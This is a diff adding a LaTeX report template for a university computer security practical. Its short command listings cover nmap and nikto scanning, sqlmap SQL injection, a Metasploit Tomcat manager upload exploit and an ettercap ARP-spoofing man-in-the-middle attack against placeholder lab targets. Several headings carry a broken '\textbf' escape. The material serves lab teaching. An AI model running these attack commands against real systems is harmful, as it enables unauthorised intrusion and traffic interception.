@@ -1,0 +1,112 @@
+\documentclass[a4paper,12pt]{article}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+
+% Define colors for code highlighting
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+\lstset{style=mystyle}
+
+\title{\textbf{COS720 Practical 2 Report} \\ Computer Information and Security I}
+\author{Student Name \\ University of Pretoria}
+\date{April 2025}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+\section{Objectives}
+\begin{itemize}
+    \item Perform network security analysis, including scanning, reconnaissance, and vulnerability assessment.
+    \item Test web applications for common vulnerabilities such as SQL injection and cross-site scripting (XSS).
+    \item Exploit vulnerabilities and escalate privileges on the target system.
+    \item Demonstrate advanced skills in network traffic manipulation and exploitation.
+\end{itemize}
+
+\section{Environment Setup}
+\textbf{Tools Used:}
+\begin{itemize}
+    \item Kali Linux VM
+    \item Ubuntu 24 LTS VM (Target Machine)
+    \item VirtualBox / VMware
+    \item Nmap, Nikto, OpenVAS/Nessus, SQLmap, Metasploit, Ettercap/Bettercap
+\end{itemize}
+
+\section{Tasks}
+
+\subsection{Network Scanning and Reconnaissance (5 Marks)}
+\begin{enumerate}
+    \item 	extbf{Discover the target's IP address:}
+    \begin{lstlisting}[language=bash]
+nmap -sn 192.168.1.0/24
+    \end{lstlisting}
+    \item 	extbf{Perform a full port scan:}
+    \begin{lstlisting}[language=bash]
+nmap -p- -sV <TARGET-IP>
+    \end{lstlisting}
+    \item 	extbf{Scan the web application for vulnerabilities:}
+    \begin{lstlisting}[language=bash]
+nikto -h http://<TARGET-IP>
+    \end{lstlisting}
+\end{enumerate}
+
+\subsection{Vulnerability Assessment (10 Marks)}
+Use Nmap NSE:
+\begin{lstlisting}[language=bash]
+nmap --script=vuln <TARGET-IP>
+\end{lstlisting}
+Perform a full vulnerability scan using OpenVAS or Nessus.
+
+\subsection{Web Application Security Testing (15 Marks)}
+\textbf{SQL Injection Test:}
+\begin{lstlisting}[language=bash]
+sqlmap -u "http://<TARGET-IP>/login.php?user=test" --dbs
+\end{lstlisting}
+
+\subsection{Exploitation and Privilege Escalation (5 Marks)}
+\textbf{Exploit a service with Metasploit:}
+\begin{lstlisting}[language=bash]
+msfconsole
+use exploit/multi/http/tomcat_mgr_upload
+set RHOST <TARGET-IP>
+exploit
+\end{lstlisting}
+
+\subsection{Man-in-the-Middle (MITM) Attack (10 Marks)}
+Using Ettercap:
+\begin{lstlisting}[language=bash]
+ettercap -T -M arp:remote /<TARGET-IP>/ //
+\end{lstlisting}
+
+\section{Findings and Analysis}
+Discuss vulnerabilities found and provide recommendations.
+
+\section{Conclusion}
+Summarize the practical, challenges faced, and lessons learned.
+
+\end{document}
